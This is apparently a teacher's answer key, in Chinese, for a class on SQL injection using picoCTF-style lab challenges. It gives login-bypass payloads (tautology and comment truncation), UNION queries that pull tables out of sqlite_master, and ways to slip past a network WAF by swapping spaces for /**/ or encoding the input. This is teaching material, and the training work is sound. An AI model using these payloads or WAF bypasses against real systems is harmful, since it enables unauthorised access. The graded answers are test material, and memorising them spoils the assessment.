## 二、逐題答案

### `303` SQL Direct（實作一）

- **介面**：題目頁給一行連線指令與密碼。picoCTF 原題給的是 `psql -h <位址> -p <埠> -U postgres pico`，密碼 `postgres`；PostgreSQL 的連線協定 `nc` 接不起來，要用 `psql`。**待確認**：repo 的實測紀錄只寫「TCP／SSH／nc 終端」，沒記實際指令，也沒記 CyLab terminal 有沒有 `psql`，上課前照題目頁連一次。不經過 HTTP，所以沒有靜默丟包的問題。
- **打法**：`\dt` 列表，再 `SELECT * FROM flags;`（分號不能省）。
- **flag**：題目給的連線物件上直接查得到；本題未記錄旗標內容，批改以「有沒有查到表並列出內容」為準。
- **教學重點**：讓學員看見「資料庫長什麼樣」，後面的登入頁才有東西可以對照。

### `80` Irish-Name-Repo 1（實作二，作業）

- **介面**：`/login.html`，表單 POST 到 `/login.php`。
- **後端結構（由行為反推）**：

  ```sql
  SELECT * FROM users WHERE name='<username>' AND password='<password>'
  ```

- **通關 payload**：

  ```text
  帳號：admin
  密碼：' OR '1'='1
  ```

- **flag**：`academy{...}`（實測值不進這份檔案）
- **實驗室網路下**：含 `or`／`and` 加比較式的請求會被掛住不回（見第三節），改送 `1'/**/or/**/true--`。手機網路應該不會遇到，尚未對照實測。
- **定位**：實作二，同時是作業。另一個可行解是截斷：帳號 `admin'-- `（`--` 後留一個空白）、密碼隨意；兩種都收，學員要能說出自己那句查詢變成什麼。

### `59` Irish-Name-Repo 2（實作三，作業）

- **介面**：`/login.html`，POST `/login.php`（與前一題同一個系列）。
- **後端結構（由行為反推）**：

  ```sql
  SELECT * FROM users WHERE name='admin'--' AND password='...'
  ```

- **通關 payload**：

  ```text
  帳號：admin'--
  密碼：（隨意，例如 123）
  ```

- **flag**：`academy{...}`（實測值不進這份檔案）
- **反應**：約 0.3 秒回應。不使用 `or`／`and`，在實驗室網路下也不會被掛住。
- **定位**：實作三，同時是作業。只需要步驟二的截斷。講義說「恆真式可能過不了」是依 picoCTF 原題（會擋 `or`）寫的，CyLab 上是否如此未記錄；學員用恆真式過了也收。

## 三、特定網路下的靜默丟包（tarpit）

> 這不是題目的行為，是備課時實驗室網路出口的現象；推測換手機網路不會出現，尚未對照實測。主線教材不依賴它，講義放在最後的備註。

2026-11-13 對靶機登入端點以 `curl` 實測（單次結果，時間為近似值）：

| 送出的值 | 結果 | 時間 |
|---|---|---|
| `admin` | 200，正常 | 約 0.4s |
| `test'` | 200，正常 | 約 0.3s |
| `1=1` | 200，正常 | 約 0.3s |
| `1 and 1` / `1 or a` | 200，正常 | 約 0.3s |
| `1 or 1=1` | 無回應（0 bytes） | 約 15s 後中斷 |
| `1 or 3=4` | 無回應 | 約 15s |
| `1 and 1=1` | 無回應 | 約 15s |
| `1 or 1 like 1` | 無回應 | 約 15s |

- **觸發條件**：`/ (or|and)\s+.*(=|like) /i` 這類「關鍵字 + 空白 + 比較式」的組合。
- **行為**：不回 403、不送 TCP RST，直接丟棄後續資料，讓客戶端等到 TCP 逾時。
- **不要學員誤判**：轉圈不是靶機壞掉，也不是打錯字，是防線存在的證據。
- **繞過**：空白換 `/**/`、`=` 換 `true`（或 `1<2` 這類恆真比較）。原理是特徵比對失效，SQL 語意不變。

完整數據見 [`../../../lab_network_waf_tarpit_report.md`](../../../lab_network_waf_tarpit_report.md)。

## 四、特殊題目的注意事項

### `8` Irish-Name-Repo 3（本次不排入）

輸入會先經過 ROT13 再進 SQL。`' or 1=1--` 經 ROT13 變成 `' be 1=1--`，字面上已經不符合防護設備的 `or`／`and` 特徵，等於「先編碼再送出」也是一種繞過。但這也表示 handout 教的 `/**/` 寫法在這題會變形，**不能沿用同一套 payload**。要排這題需另外備課。

### `358` More SQLi（課堂示範）

- **介面**：`/` 的登入表單；登入後跳到 `welcome.php`，是一個辦公室搜尋框，結果印成表格。
- **後端結構（由行為反推，實測紀錄）**：

  ```sql
  SELECT id FROM users WHERE password = '<password>' AND username = '<username>'
  ```

  密碼條件在前、帳號在後。

- **登入**：帳號隨意、密碼 `1' or true--`（實驗室網路改 `1'/**/or/**/true--`）。已實測。
- **路線一，看 302 的內容（已實測）**：登入成功的回應是 `302 Found`，flag 在這個回應的內容裡；瀏覽器立刻跳到 `welcome.php`，畫面和 DevTools 都看不到。用 Burp 的 HTTP history，或：

  ```bash
  curl -i -s --data-urlencode "username=admin" --data-urlencode "password=1' or true--" <登入網址>
  ```

  欄位名稱與網址以登入頁原始碼為準，實測紀錄沒有記。

- **路線二，搜尋框 UNION（未在 CyLab 實跑，依 picoCTF 原題公開解法）**：

  | 步驟 | 搜尋框送出 | 預期 |
  |---|---|---|
  | 探欄位數 | `' ORDER BY 3--`、`' ORDER BY 4--` | 3 正常、4 出錯，3 欄 |
  | 找回顯位置 | `' UNION SELECT 1,2,3--` | 表格多一列 `1 2 3` |
  | 列出表 | `' UNION SELECT name, sql, null FROM sqlite_master--` | 有一張 `more_table`，欄位含 `flag` |
  | 取資料 | `' UNION SELECT flag, null, null FROM more_table--` | flag 印在第一欄 |

  兩條路線拿到的是不是同一個 flag，沒有紀錄。上台前照表走一次，把實際的欄位數與表名改進 `demo.md`。

- **flag**：`academy{...}`（實測值不進這份檔案）

### `304` SQLiLite（候選，不排入）

Medium。已由授課者驗證，但 repo 內沒有記錄可用的 payload；實測紀錄提到登入成功後 flag 藏在 HTML 的 `<p hidden>` 裡，要看原始碼。

### `729` Sql Map1（不排入）

題庫快照裡題名標為推測，ID 可能對不上。排入前先在平台上以題名搜尋確認。

## 五、作業理解問題參考答案

對應 `assignment.md` 的三題。

1. **SQL Direct：flag 在哪一張表？下了哪些指令？**
   `flags` 表。`\dt` 列出有哪些表，再 `SELECT * FROM flags;`。能說出「先列表、再查內容」就算對。

2. **Irish-Name-Repo 1：帳號、密碼欄各填了什麼？為什麼沒有正確的密碼也能登入？**
   恆真式解：帳號 `admin`、密碼 `' OR '1'='1`。輸入的引號把密碼字串提早關掉，後面接上一個永遠成立的條件，查詢變成 `… name='admin' AND password='' OR '1'='1'`，每一列都符合。截斷解：帳號 `admin'-- `、密碼隨意，密碼條件被註解掉。兩種都收。要看到的是「我的輸入變成了查詢的一部分」這個意思；只貼字串、說不出為什麼的，給一半。

3. **Irish-Name-Repo 2：帳號、密碼欄各填了什麼？跟上一題差在哪裡？**
   帳號 `admin'--`、密碼隨意。差別：上一題（恆真式）是多加一個永遠成立的條件，讓帳號和密碼的檢查都失效；這一題是把密碼那一半截掉，帳號的檢查還在，所以登入的是指名的 `admin`。上一題就用截斷的學生，這裡答「做法一樣，都是截掉密碼條件」也對。

**額外加分：自己找一題 SQL 注入**

教授指定的加分方式。作業排除必做三題與示範的 More SQLi（講義已給完整字串）。批改看三件事：題目確實是 SQL 注入、寫得出自己的輸入、說得出為什麼行得通；只貼 flag 或只貼字串不給分。學生最可能找到的題：

| 題 | 重點 | 備註 |
|---|---|---|
| `304` SQLiLite | 登入繞過後 flag 在 HTML 的 `<p hidden>` 裡 | 實測紀錄有；要會看原始碼 |
| `8` Irish-Name-Repo 3 | 輸入先經 ROT13 才進查詢，要先把字串反轉換 | 實測紀錄有 |
| Web Gauntlet 系列、SQL 相關新題 | 過濾關鍵字後的繞法 | repo 無紀錄，批改時以學生的說明為準 |

> 批改原則：flag 只證明「做到」，分數看能不能講清機制。答案寫對但說不出為什麼，給一半。

## 六、常見排錯

| 狀況 | 原因 | 處理 |
|---|---|---|
| 瀏覽器一直轉圈，最後逾時 | 網路出口的防護設備把請求掛住（實驗室網路實測） | 換手機網路；換不了就改用不含 `or`／`and` + 空白的寫法，或把空白換成 `/**/` |
| `/**/` 打了卻沒過 | 引號與註解順序沒對上（`1'/**/or/**/true--`） | 對照 handout 最後備註的完整字串，逐字元比對 |
| 登入成功但沒有 flag | 進的是普通使用者頁面，不是 admin | 確認帳號條件指名 `admin` |
| `303` 連不上 | 連線資訊有時效，題目環境會重開 | 重新整理題目頁，取新的位址與埠 |
| `59` 打 `admin'--` 沒反應 | 帳號欄位打錯字，或 `--` 後面少了空白 | 用 `admin'--`（多數環境 `--` 後接空白較穩） |
| 想測 `1 AND 1=1` 卻卡住 | 這個寫法本身就在特徵裡 | 改用 `1/**/and/**/1=1`，或先做純字串探針 |

## 七、教學定位

- **技能階梯**：M5（輸入信任與注入），對應講義無（紅隊補充）。路徑穿越已由情境演練（CVE-2021-41773）帶過，本堂不重複。
- **與 M4 的分界**：M4 攻的是身分（cookie、token、簽章、鎖定依據），M5 攻的是語法（輸入被當查詢執行）。`Local Authority` 表面也是登入頁，但技能屬 M2／M4，只能當對照，不列入本堂作業。
- **本堂終點**：學員能自己判斷一個輸入點是不是拼接、能閉合查詢、知道恆真式和截斷各改了查詢的哪一部分。UNION 拖庫屬延伸，不在必做範圍。
